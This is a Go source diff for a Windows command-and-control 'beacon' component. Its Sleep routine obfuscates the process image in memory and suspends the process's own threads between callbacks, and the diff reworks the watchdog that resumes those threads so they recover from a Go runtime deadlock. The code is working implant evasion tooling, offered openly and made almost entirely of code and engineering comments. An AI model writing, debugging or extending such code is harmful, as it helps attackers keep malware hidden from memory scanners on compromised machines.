@@ -47,6 +47,7 @@ import (
 	"runtime"
 	"sync/atomic"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -93,20 +94,24 @@ const (
 	// live in .rdata and are trivially discoverable with `strings`.
 	apcDebug = true
 
-	// Watchdog: a one-shot Windows thread-pool timer that fires from a
-	// TppWorkerThread if the Sleep cycle doesn't complete in the expected
-	// time. See ANALYSIS.md for the full theory — briefly, the beacon can
-	// deadlock in Go's exitsyscall after any LazyProc.Call because our
-	// SuspendThread can freeze the M holding our P. The watchdog runs on
-	// a thread we never suspend (TppWorker start address is in ntdll,
-	// filtered out of our image-based suspension set), so it can always
-	// fire and rescue us by force-resuming peers.
+	// Watchdog: per-peer one-shot Windows thread-pool timers. Each timer's
+	// callback is procResumeThread.Addr() DIRECTLY — no Go callback, no
+	// LazyProc.Call, no cgocallback path. If Sleep deadlocks in the
+	// P-handoff race (see ANALYSIS.md), each timer independently fires
+	// ResumeThread on its assigned peer, breaking the deadlock without
+	// requiring any Go-mediated syscall to succeed.
 	//
-	// Margin over the intended sleep duration before the watchdog fires.
-	// Sized generously — real Sleep cycles complete within sleepMs +
-	// small overhead, so anything past sleepMs + margin means we're
-	// wedged.
-	watchdogMarginMs = 15000
+	// The previous implementation used a single Go-callback timer that
+	// ran a Toolhelp+enumerate loop. It never worked because the callback
+	// itself needs a P to acquire from Go's runtime (via cgocallback →
+	// needm → acquirep), and when every Go M is suspended there are no
+	// Ps to hand out. The direct-API design bypasses all of that.
+	//
+	// Margin is proportional to sleep interval, floored/capped so short
+	// beacons recover quickly and long beacons don't waste time on a
+	// margin that will never trigger anyway.
+	watchdogMarginMinMs = 5000
+	watchdogMarginMaxMs = 15000
 
 	// WT_EXECUTEONLYONCE: this timer fires exactly once and self-deletes.
 	// From Windows headers.
@@ -311,10 +316,8 @@ func init() {
 		}
 	}
 
-	// Pre-create the watchdog callback trampoline exactly once — NewCallback
-	// allocates from a per-process pool that we don't want to churn every
-	// Sleep cycle.
-	watchdogCallbackPtr = syscall.NewCallback(watchdogFire)
+	// (The watchdog no longer uses a Go callback. See the design notes
+	// near CreateTimerQueueTimer usage in Sleep().)
 
 	// The trampoline references apcArgs fields by hard-coded byte offset.
 	// Fail loudly at startup if Go's struct layout has drifted from what
@@ -571,103 +574,22 @@ func resumePeers(cycle uint64, tids []uint32) {
 	}
 }
 
-// watchdogArgs is the state passed to the watchdog callback. Heap-allocated
-// per Sleep call. The `fired` flag tells the Sleep caller whether the
-// watchdog actually rescued us or was cancelled unfired.
-//
-// Kept intentionally tiny — the callback dereferences these fields from
-// a thread-pool worker context and we don't want any pointer chasing.
-type watchdogArgs struct {
-	currentTID uint32
-	_pad       uint32
-	imageBase  uintptr
-	imageEnd   uintptr
-	fired      atomic.Bool
-	resumed    atomic.Int32
-}
-
-// watchdogCallbackPtr is the pre-resolved Go->C trampoline that the
-// Windows thread-pool timer invokes. Created once at package init so we
-// don't leak a NewCallback allocation per Sleep cycle.
-var watchdogCallbackPtr uintptr
-
-// watchdogFire runs on a TppWorkerThread (Windows thread-pool worker)
-// when the timer expires. Its entire job is to break a P-handoff
-// deadlock in Sleep by force-resuming every image-based peer.
-//
-// Called with (lpParameter uintptr, TimerOrWaitFired uintptr) per the
-// WaitOrTimerCallback signature. We only use the first argument.
-//
-// This runs on a thread whose start address is inside ntdll (not our
-// image), so it is NEVER captured by suspendImagePeers' filter and can
-// always execute — even when every Go M is suspended.
-//
-// Extra Ms created by Go for foreign-thread callbacks do not own a P,
-// so their entersyscall/exitsyscall does not participate in the same
-// P-handoff race that traps the main Sleep goroutine. That is why the
-// watchdog can safely make LazyProc.Call syscalls (OpenThread,
-// ResumeThread, NtQueryInformationThread) that would otherwise be a
-// vector for the very race we're rescuing from.
-func watchdogFire(lpParameter uintptr, _ uintptr) uintptr {
-	args := (*watchdogArgs)(unsafe.Pointer(lpParameter))
-	args.fired.Store(true)
-	dbg("WATCHDOG FIRED - force-resuming image-based peers")
-
-	hSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
-	if err != nil {
-		dbg("WATCHDOG snapshot err=%v", err)
-		return 0
+// watchdogTimeoutMs returns the deadline (in ms) after which the
+// per-peer watchdog timers should fire. Proportional to sleepMs, so
+// short-interval beacons recover quickly while long-interval beacons
+// don't wait 5x their sleep before rescuing.
+func watchdogTimeoutMs(sleepMs uint64) uint64 {
+	margin := sleepMs
+	if margin < watchdogMarginMinMs {
+		margin = watchdogMarginMinMs
+	} else if margin > watchdogMarginMaxMs {
+		margin = watchdogMarginMaxMs
 	}
-	defer windows.CloseHandle(hSnap)
-
-	var te windows.ThreadEntry32
-	te.Size = uint32(unsafe.Sizeof(te))
-	if err := windows.Thread32First(hSnap, &te); err != nil {
-		return 0
+	total := sleepMs + margin
+	if total > 0x7FFFFFFF {
+		total = 0x7FFFFFFF // CreateTimerQueueTimer's DueTime is DWORD
 	}
-
-	currentPID := uint32(windows.GetCurrentProcessId())
-	resumed := int32(0)
-
-	for {
-		if te.OwnerProcessID == currentPID && te.ThreadID != args.currentTID {
-			hThread, oerr := windows.OpenThread(
-				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
-				false, te.ThreadID,
-			)
-			if oerr == nil {
-				// Filter to image-based threads (same rule as suspend pass).
-				var startAddr, retLen uintptr
-				procNtQueryInformationThread.Call(
-					uintptr(hThread),
-					threadQuerySetWin32StartAddress,
-					uintptr(unsafe.Pointer(&startAddr)),
-					unsafe.Sizeof(startAddr),
-					uintptr(unsafe.Pointer(&retLen)),
-				)
-				if startAddr >= args.imageBase && startAddr < args.imageEnd {
-					// Drain-resume: keep calling ResumeThread until the
-					// previous count was 0, 1, or an error. Idempotent —
-					// threads that were already resumed just return 0.
-					for i := 0; i < maxResumeDrain; i++ {
-						r, _, _ := procResumeThread.Call(uintptr(hThread))
-						if r == 0 || r == 1 || r == dwordMinusOne {
-							break
-						}
-					}
-					resumed++
-				}
-				windows.CloseHandle(hThread)
-			}
-		}
-		if err := windows.Thread32Next(hSnap, &te); err != nil {
-			break
-		}
-	}
-
-	args.resumed.Store(resumed)
-	dbg("WATCHDOG done resumed=%d", resumed)
-	return 0
+	return total
 }
 
 // Sleep obfuscates the current process image for sleepMs milliseconds.
@@ -691,6 +613,7 @@ func Sleep(sleepMs uint64) error {
 		return nil
 	}
 	cycle := cyclesTotal.Add(1)
+	sleepStart := time.Now()
 	dbg("cycle=%d enter Sleep sleepMs=%d cyclesTotal=%d errors=%d",
 		cycle, sleepMs, cycle, errorsTotal.Load())
 
@@ -795,34 +718,44 @@ func Sleep(sleepMs uint64) error {
 	}
 	dbg("cycle=%d suspend done tids=%d currentTID=%d", cycle, len(suspendedTIDs), currentTID)
 
-	// ARM THE WATCHDOG.
+	// ARM THE WATCHDOG (one direct-API timer per suspended peer).
 	// Everything below this point may deadlock in Go's exitsyscall if a
 	// suspended M is holding the P we release when we entersyscall. The
-	// watchdog fires from a thread-pool worker (which we never suspend)
-	// after sleepMs + watchdogMarginMs and force-resumes every image-based
-	// peer, breaking any such deadlock. If Sleep completes normally we
-	// cancel it below.
-	wdArgs := &watchdogArgs{
-		currentTID: currentTID,
-		imageBase:  imageBase,
-		imageEnd:   imageEnd,
+	// watchdog is one one-shot CreateTimerQueueTimer per peer, with
+	// procResumeThread.Addr() as the callback — a raw Windows API pointer,
+	// NOT a Go callback. When it fires it invokes
+	// ResumeThread(hThread) directly on a thread-pool worker (which we
+	// never suspend), with zero Go runtime involvement, no LazyProc.Call,
+	// no cgocallback, no P acquisition. That's the crucial difference
+	// from the previous Go-callback design — the previous one deadlocked
+	// in the same way as the caller because its own syscalls needed a P.
+	wdTimeoutMs := watchdogTimeoutMs(sleepMs)
+	wdHandles := make([]windows.Handle, 0, len(suspendedTIDs))
+	wdTimers := make([]uintptr, 0, len(suspendedTIDs))
+	for _, tid := range suspendedTIDs {
+		hT, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
+		if err != nil {
+			continue
+		}
+		var hTimer uintptr
+		wdRet, _, _ := procCreateTimerQueueTimer.Call(
+			uintptr(unsafe.Pointer(&hTimer)),
+			0, // NULL queue = default process-wide queue
+			procResumeThread.Addr(),
+			uintptr(hT),
+			uintptr(wdTimeoutMs),
+			0, // Period = 0 (one-shot)
+			wtExecuteOnlyOnce,
+		)
+		if wdRet == 0 {
+			windows.CloseHandle(hT)
+			continue
+		}
+		wdHandles = append(wdHandles, hT)
+		wdTimers = append(wdTimers, hTimer)
 	}
-	watchdogTimeoutMs := sleepMs + watchdogMarginMs
-	if watchdogTimeoutMs > 0x7FFFFFFF {
-		watchdogTimeoutMs = 0x7FFFFFFF // CreateTimerQueueTimer's DueTime is DWORD
-	}
-	var hWatchdogTimer uintptr
-	wdRet, _, _ := procCreateTimerQueueTimer.Call(
-		uintptr(unsafe.Pointer(&hWatchdogTimer)),
-		0, // NULL timer queue = default process-wide queue
-		watchdogCallbackPtr,
-		uintptr(unsafe.Pointer(wdArgs)),
-		uintptr(watchdogTimeoutMs),
-		0, // Period = 0 (one-shot)
-		wtExecuteOnlyOnce,
-	)
-	if wdRet == 0 {
-		dbg("cycle=%d watchdog arm FAILED — continuing without safety net", cycle)
+	if len(wdTimers) != len(suspendedTIDs) {
+		dbg("cycle=%d watchdog partial arm: %d/%d timers", cycle, len(wdTimers), len(suspendedTIDs))
 	}
 
 	// SuspendThread is asynchronous — give the kernel a moment to commit
@@ -875,19 +808,28 @@ func Sleep(sleepMs uint64) error {
 	resumePeers(cycle, suspendedTIDs)
 
 	// DISARM THE WATCHDOG.
-	// Sleep completed normally. Cancel the pending one-shot timer.
-	// INVALID_HANDLE_VALUE as CompletionEvent tells DeleteTimerQueueTimer
-	// to block until any in-flight callback finishes — necessary so the
-	// callback can't be running (and dereferencing wdArgs) after Sleep
-	// returns and wdArgs may be GC'd. The callback is fast and lives
-	// entirely on a thread we never suspend, so this wait is bounded.
-	if hWatchdogTimer != 0 {
-		procDeleteTimerQueueTimer.Call(0, hWatchdogTimer, ^uintptr(0))
+	// Cancel every per-peer timer. INVALID_HANDLE_VALUE as CompletionEvent
+	// tells DeleteTimerQueueTimer to block until any in-flight callback
+	// finishes — necessary so a firing timer isn't still running when we
+	// close its target handle. The callback is a single ResumeThread
+	// syscall, so this wait is trivially bounded.
+	//
+	// Threads that were already resumed by our own resumePeers pass will
+	// see ResumeThread return 0 (was not suspended) — a harmless no-op.
+	for _, hTimer := range wdTimers {
+		procDeleteTimerQueueTimer.Call(0, hTimer, ^uintptr(0))
 	}
-	if wdArgs.fired.Load() {
-		// The watchdog rescued us. Log it — this is our top-signal event.
-		dbg("cycle=%d WATCHDOG RESCUED sleep (resumed=%d peers)",
-			cycle, wdArgs.resumed.Load())
+	for _, hT := range wdHandles {
+		windows.CloseHandle(hT)
+	}
+
+	// If our actual sleep duration significantly exceeded the intended
+	// duration, some watchdog timer must have fired to rescue us. This
+	// is our top-signal event.
+	elapsedMs := uint64(time.Since(sleepStart).Milliseconds())
+	if elapsedMs > sleepMs+watchdogMarginMinMs {
+		dbg("cycle=%d WATCHDOG likely RESCUED (elapsedMs=%d intendedMs=%d)",
+			cycle, elapsedMs, sleepMs)
 	}
 
 	dbg("cycle=%d Sleep returning", cycle)
@@ -898,7 +840,6 @@ func Sleep(sleepMs uint64) error {
 	// compiler changes.
 	runtime.KeepAlive(keyBuf)
 	runtime.KeepAlive(args)
-	runtime.KeepAlive(wdArgs)
 
 	return nil
 }
